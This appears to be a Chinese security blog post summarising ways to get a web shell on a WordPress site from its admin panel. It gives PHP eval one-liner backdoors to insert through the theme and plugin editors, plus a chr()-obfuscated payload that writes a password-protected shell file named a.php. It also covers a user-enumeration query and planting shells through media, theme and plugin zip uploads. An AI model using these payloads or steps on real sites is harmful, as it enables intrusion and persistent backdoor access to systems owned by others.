---
title:  Wordpress 后台GetShell总结
date: 2019-11-6 23:10:13
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - Wordpress
    - GetShell
---
# 0x00 前言

Wordpress后台Getshell的方法网上公开了很多，在此记录总结一下

相比于前台，wordpress后台的防御的就低得多
Wordpress的插件和主题功都可以上传和线编辑
很容易就可以插入木马getshell

`?author=1` 遍历用户名

# 0x01 在线编辑getshell
## 编辑主题
### 第一种
在后台找到主题外观编辑
选择主题，在右侧选择php文件

在`PHP`标签内写入 `@eval($_POST[a]);`
或者在`PHP`标签外写入 `<?php @eval($_POST['code']);?>`
提交更改

路径为 
`url+/wp-content/themes/+主题名/+修改文件的文件名`

连接即可

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191107003059.png)



也可以在这里写入

`url+/wp-content/themes/Begin/inc/xxx.php`

### 第二种

进入主题编辑器，选择要编辑的主题，要编辑的文件
插入下方payload,然后访问之
(报下图错不用管)
`url+/wp-content/themes/编辑的主题/编辑的文件`

这样就在该目录下生成一句话木马文件
文件名  `a.php`   密码  `a`
路径 `url+/wp-content/themes/编辑的主题/a.php`


```
<script language="php">fputs(fopen(chr(46).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112),w),chr(60).chr(63).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(97).chr(93).chr(41).chr(59).chr(63).chr(62));</script>
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191107001505.png)

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191107002023.png)

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191107002415.png)


## 编辑插件

和编辑主题思路方法一致

路径为

`url+/wordpress321/wp-content/plugins/+更改的插件名+/+更改的文件名`


# 0x02 上传getshell
## 媒体上传

在WordPress管理页面的左边单击“媒体”-“新增媒体案”
接着就会出来一个上传的界面，在该界面中选择“Browser 上傳功能”
直接选择php的Webshell上传即可；

## 上传主题

上传一个压缩了木马的zip
或者在官方主题中加入木马重新打包成zip更好
则木马路径为

`url+/wp-content/themes/+主题名+/木马名`



## 上传插件

和上传主题的思路一样

路径为

`url+/wp-content/plugins/+插件名+/木马名`




# 参考文章
[wordpress 后台拿webshell](https://www.i0day.com/227.html)
[Wordpress后台Getshell](https://www.jianshu.com/p/ffdbc362b69a)